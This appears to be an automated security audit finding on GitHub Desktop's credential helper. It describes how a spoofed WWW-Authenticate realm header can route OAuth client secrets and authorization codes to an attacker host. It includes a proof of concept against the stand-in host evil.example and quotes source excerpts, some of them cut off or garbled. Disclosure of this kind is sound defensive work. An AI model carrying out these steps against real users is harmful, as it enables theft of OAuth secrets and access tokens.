### Title
Attacker-controlled `WWW-Authenticate` header spoofs a GitHub Enterprise sign-in flow and exfiltrates the app's OAuth client secret and authorization code to an arbitrary host - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
`getEndpointKind()` classifies a git remote as a GitHub Enterprise ("enterprise") host purely by inspecting the `wwwauth[]` credential-helper field, which is copied verbatim from the HTTP `WWW-Authenticate` response header returned by the remote server. That header is fully attacker-controlled (any git server, proxy, or MITM the user's git client talks to). When Desktop believes it's talking to an "enterprise" GitHub host it starts the `beginEnterpriseSignIn` flow and points it at that arbitrary origin, which — if the user continues — sends the app's bundled OAuth `client_id`, then later the OAuth `client_secret` and authorization `code`, to that attacker-controlled origin.

### Finding Description
`getEndpointKind` in [1](#0-0)  derives the credential-helper classification from server-supplied data: [2](#0-1) 
Git forwards any `WWW-Authenticate` header verbatim as `wwwauth[]=...` to the credential helper. Because this string comes straight from the HTTP response of whatever remote/proxy the user's git operation talks to, a malicious or compromised remote (or a MITM on a plain-HTTP/self-signed remote) can send `WWW-Authenticate: Basic realm="GitHub"` and force `getEndpointKind` to return `'enterprise'` for a domain that has nothing to do with GitHub.

That classification feeds directly into `getCredential`: [3](#0-2) 
Since no account exists for the spoofed `apiEndpoint`, Desktop calls `ui.promptForGitHubSignIn(endpoint)`: [4](#0-3) 
which invokes `dispatcher.beginEnterpriseSignIn(cb)` and `dispatcher.setSignInEndpoint(origin)` with `origin` equal to the attacker's host, then shows the Sign In popup with `isCredentialHelperSignIn: true`.

If the user proceeds ("Sign in using your browser" is the only button in `AuthenticationForm`, see [5](#0-4) ), `authenticateWithBrowser()` is invoked: [6](#0-5) 
`getOAuthAuthorizationURL(endpoint, csrfToken)` builds a URL rooted at the attacker's `endpoint` and appends the app's real, bundled `client_id`: [7](#0-6) 
This is opened in the external browser, sending the client_id to the attacker's server. When the (attacker-crafted) page redirects back to Desktop's `x-github-client://oauth` deep link with a `code`/`state`, `resolveOAuthRequest` exchanges it via `requestOAuthToken(endpoint, action.code)`: [8](#0-7) 
which POSTs the bundled OAuth `client_id` **and `client_secret`**, plus the attacker-supplied `code`, to the attacker's own `endpoint`: [9](#0-8) 

The corrupted value here is the `endpoint`/`origin` used for the entire enterprise sign-in and OAuth-token-exchange flow: it is seeded not from a user-typed URL (as the "Add Enterprise Account" flow requires) but from an unauthenticated HTTP response header returned by whatever remote server the user's git operation contacted. No guard in `getEndpointKind` cross-checks the header claim against any authenticated fact (TLS identity, known API endpoint, existing account) before treating the host as GitHub-affiliated and routing it into the OAuth flow.

### Impact Explanation
An attacker who controls (or can MITM) a git remote referenced by the victim — e.g., a malicious/compromised clone URL, or a plain HTTP/self-signed-cert remote — can trick Desktop's credential-helper logic into presenting a "Sign in to GitHub Enterprise" prompt for an arbitrary domain of the attacker's choosing, entirely from within a normal `git fetch`/`clone`/`push`. If the user proceeds through the (single-button) browser sign-in flow, the app's bundled OAuth `client_secret` and the authorization code are sent to the attacker's server via `requestOAuthToken`. Possession of `client_id`+`client_secret` lets an attacker stand up a convincing "Sign in with GitHub Desktop" phishing flow that can complete real OAuth code exchanges against `api.github.com` and obtain **other victims'** GitHub access tokens (`repo`, `user`, `workflow` scopes), i.e., real credential/token exfiltration beyond the initial victim.

### Likelihood Explanation
Triggering the header spoof requires no privileged access — only that the victim's Desktop performs a git network operation (clone/fetch/push/pull) against a server the attacker controls or intercepts, which is squarely inside the "attacker controls a git remote/proxy response" primitive. The remaining step (user clicking through an Enterprise sign-in popup and completing browser OAuth) does require some user interaction, and the OAuth secret is also statically embedded in the webpack bundle (already acknowledged in `docs/technical/oauth.md` as not truly secret) which somewhat limits novel severity, but this path additionally causes an *unsolicited* Enterprise sign-in prompt to appear for a host the user never chose to add an account for, which is itself a spoofing/social-engineering enabler that today's `getEndpointKind` does nothing to prevent.

### Recommendation
- Do not trust the `wwwauth[]` realm string alone to classify a host as GitHub/Enterprise; only treat a host as `'enterprise'`/`'github.com'` after an authenticated check (e.g., `isGitHubHost()` API probe or an existing matching `Account`), removing the `realm="GitHub"` happy-path branch at [10](#0-9) .
- Before invoking `ui.promptForGitHubSignIn(endpoint)` from the credential helper, surface to the user which host is asking and warn that it was inferred from server-supplied data, or require it to match a previously-added Enterprise endpoint.
- Rate/track how many times an unprompted Enterprise sign-in can be initiated from the credential-helper path per session/host, and log the header-derived classification for audit.

### Proof of Concept
1. Host a git-over-HTTP(S) server (or a local MITM proxy) for a domain the attacker controls, e.g. `https://evil.example`.
2. Configure the server to respond to Git's authentication probe with header `WWW-Authenticate: Basic realm="GitHub"` on a 401 response.
3. Get the victim to run `git clone https://evil.example/foo.git` (or add it as a remote and `fetch`) inside GitHub Desktop.
4. Desktop's trampoline credential helper calls `getEndpointKind`, sees the `wwwauth[]` value containing `realm="GitHub"`, and returns `'enterprise'` ( [10](#0-9) ).
5. Since no account matches `evil.example`, `ui.promptForGitHubSignIn('https://evil.example')` fires, showing a "Sign in" popup pointed at `evil.example` ( [4](#0-3) ).
6. Victim clicks "Sign in using your browser"; Desktop opens `https://evil.example/login/oauth/authorize?client_id=<real client id>&...` in the browser ( [7](#0-6) ) — attacker's server now has the client_id and can serve a fake consent page that redirects to `x-github-client://oauth?code=<attacker-code>&state=...`.
7. Desktop's `resolveOAuthRequest` calls `requestOAuthToken('https://evil.example', code)`, POSTing `client_id`, `client_secret`, and `code` to `https://evil.example/login/oauth/access_token` ( [9](#0-8) ), completing exfiltration of the OAuth secret material to the attacker-controlled host.

const getEndpointKind = async (cred: Credential, store: Store) => {
  const credentialUrl = getCredentialUrl(cred)
  const endpoint = `${credentialUrl}`

  if (isGist(endpoint)) {
    return 'generic'
  }

  if (isDotCom(endpoint)) {
    return 'github.com'
  }

  if (isGHE(endpoint)) {
    return 'ghe.com'
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  const existingAccount = await findGitHubTrampolineAccount(store, endpoint)
  if (existingAccount) {
    return isDotCom(existingAccount.endpoint) ? 'github.com' : 'enterprise'
  }

  // All GitHub hosts use HTTPS, so if the protocol is not HTTPS we can
  // assume that this is not a GitHub host.
  if (credentialUrl.protocol !== 'https:') {
    return 'generic'
  }

  return (await isGitHubHost(endpoint)) ? 'enterprise' : 'generic'

  public promptForGitHubSignIn(endpoint: string): Promise<Account | undefined> {
    return new Promise<Account | undefined>(async resolve => {
      const cb = (result: SignInResult) => {
        resolve(result.kind === 'success' ? result.account : undefined)
        this.dispatcher.closePopup(PopupType.SignIn)

      const { hostname, origin } = new URL(endpoint)
      if (hostname === 'github.com') {
        this.dispatcher.beginDotComSignIn(cb)
      } else {
        this.dispatcher.beginEnterpriseSignIn(cb)
        await this.dispatcher.setSignInEndpoint(origin)
      }

      this.dispatcher.showPopup({
        type: PopupType.SignIn,
        isCredentialHelperSignIn: true,
        credentialHelperUrl: endpoint,
      })
    }).catch(e => {
      log.error(`Could not prompt for GitHub sign in`, e)
      return undefined
    })
  }

  public async resolveOAuthRequest(action: IOAuthAction) {
    if (!this.state || this.state.kind !== SignInStep.Authentication) {
      return
    }

    if (!this.state.oauthState) {
      return
    }

    if (this.state.oauthState.state !== action.state) {

      this.state.oauthState.onAuthCompleted(account)

        new Error('Failed retrieving authenticated user')
      )
    }
  }

export async function requestOAuthToken(
  endpoint: string,
  code: string
): Promise<string | null> {
  try {
    const urlBase = getHTMLURL(endpoint)
    const response = await request(
      urlBase,
      null,
      'POST',
      'login/oauth/access_token',
      {
        client_id: ClientID,
        client_secret: ClientSecret,
        code: code,
      }
    )
    tryUpdateEndpointVersionFromResponse(endpoint, response)

    const result = await parsedResponse<IAPIAccessToken>(response)
    return result.access_token
  } catch (e) {
    log.warn(`requestOAuthToken: failed with endpoint ${endpoint}`, e)
    return null
  }
}
